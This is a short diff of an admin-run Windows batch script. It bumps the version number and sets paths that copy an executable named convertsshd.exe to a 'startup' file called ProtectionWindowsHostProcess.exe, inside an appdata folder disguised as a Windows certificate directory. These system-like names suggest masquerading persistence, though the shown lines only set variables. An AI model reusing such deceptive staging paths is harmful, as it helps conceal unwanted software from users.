@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=4.5"
+set "BATCHVERSION=4.6"
 set "RESULT=%TEMP%\TUSELMP.txa"
 
 
@@ -358,7 +358,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 :: Define the folder and file paths
-set "targetFolder=%TEMP%\Windows\SystemCertificatesData\Tasks"
+set "targetFolder=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks"
 set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
 set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
 
